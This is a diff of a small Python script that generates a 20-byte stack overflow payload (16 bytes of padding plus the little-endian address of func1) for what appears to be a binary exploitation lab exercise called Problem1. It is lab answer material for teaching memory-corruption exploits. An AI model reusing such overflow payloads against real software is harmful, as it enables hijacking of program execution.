@@ -1,26 +1,20 @@
 #!/usr/bin/env python3
 """
-Generate ans1.txt payload for Problem1.
+Problem1 Payload Generator
 
-Usage:
-  python3 scripts/generate_ans1.py
+Generate ans1.txt for stack overflow exploit in problem1.
+Creates a 20-byte payload that overflows the buffer and redirects execution to func1.
 
-This writes a 20-byte file matching the payload used in the lab:
-  16 bytes padding + 4-byte little-endian target address
+Payload structure:
+- 16 bytes of padding ('A')
+- 4 bytes: address of func1 function (0x00401216, little-endian)
 """
+
 from pathlib import Path
 
-OUT_PATH = Path(__file__).resolve().parents[1] / "ans1.txt"
+# 16 bytes padding + func1 address (0x00401216 in little-endian)
+payload = b"A" * 16 + b"\x16\x12\x40\x00"
 
-def main():
-    padding = b"A" * 16
-    # Low 4 bytes of target function address (little-endian)
-    target_low4 = b"\x16\x12\x40\x00"
-    payload = padding + target_low4
-    OUT_PATH.write_bytes(payload)
-    print(f"wrote {OUT_PATH} ({len(payload)} bytes)")
-
-if __name__ == "__main__":
-    main()
-
+# Write to ans1.txt in parent directory
+Path(__file__).resolve().parents[1].joinpath("ans1.txt").write_bytes(payload)
 
